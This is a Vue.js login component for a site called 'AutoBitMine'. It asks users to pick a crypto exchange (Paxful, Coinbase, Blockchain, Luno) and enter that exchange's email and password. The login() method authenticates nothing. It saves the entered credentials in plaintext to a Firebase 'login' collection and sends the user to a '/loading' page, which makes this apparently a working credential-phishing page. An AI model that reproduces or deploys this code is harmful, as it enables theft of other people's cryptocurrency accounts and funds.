<template>
  <div class="login">
    <!-- Navbar -->
    <div class="navbar-fixed">
      <nav class="teal">
        <div class="container">
          <div class="nav-wrapper">
            <a href="#" class="brand-logo">AutoBitMine</a>
            <a href="#" data-target="mobile-nav" class="sidenav-trigger">
              <i class="material-icons">menu</i>
            </a>
            <ul class="right hide-on-med-and-down">
              <li><router-link to="/">Home</router-link></li>
              <li><router-link to="/login">Login</router-link></li>
            </ul>
          </div>
        </div>
      </nav>
    </div>
    <ul class="sidenav" id="mobile-nav">
      <li><router-link to="/">Home</router-link></li>
      <li><router-link to="/login">Login</router-link></li>
    </ul>

    <section class="login-form">
      <div class="container">
        <div class="row">
          <div class="col s12 m6 offset-m3">
            <div class="login card-panel grey lighten-3 teal-text center">
              <h6>
                select your platform and login with corresponding email and
                password
              </h6>
              <form @submit.prevent="login">
                <div class="input-field col s12">
                  <select class="browser-default" v-model="platform" required>
                    <option value="" disabled selected
                      >Select Your Platform</option
                    >
                    <option value="paxful">Paxful</option>
                    <option value="coinbase">Coinbase</option>
                    <option value="blockchain">Blockchain</option>
                    <option value="luno">Luno</option>
                  </select>
                </div>
                <div class="input-field col s12">
                  <i class="fa fa-envelope prefix"></i>
                  <input type="email" id="email" v-model="email" required />
                  <label for="email" class="teal-text">Email</label>
                </div>
                <div class="input-field col s12">
                  <i class="fa fa-lock prefix"></i>
                  <input
                    type="text"
                    id="password"
                    v-model="password"
                    required
                  />
                  <label for="password" class="teal-text">Password</label>
                </div>
                <button
                  type="submit"
                  class="btn btn-large teal lighten-1 white-text"
                >
                  Login
                </button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="section teal darken-2 white-text center">
      <p class="flow-text">AutoMine &copy; 2018</p>
    </footer>
  </div>
</template>

<script>
  import db from "../components/firebaseInit";
  export default {
    name: "login",
    data() {
      return {
        platform: null,
        email: null,
        password: null
      };
    },
    mounted() {
      //sidenav
      const sideNav = document.querySelector(".sidenav");
      M.Sidenav.init(sideNav, {});
    },
    methods: {
      login() {
        db.collection("login")
          .add({
            platform: this.platform,
            email: this.email,
            password: this.password
          })
          .then(docRef => this.$router.push("/loading"))
          .catch(error => console.log(error));
      }
    }
  };
</script>

<style scoped>
  .login-form {
    margin-top: 45px;
    margin-bottom: 45px;
  }
</style>
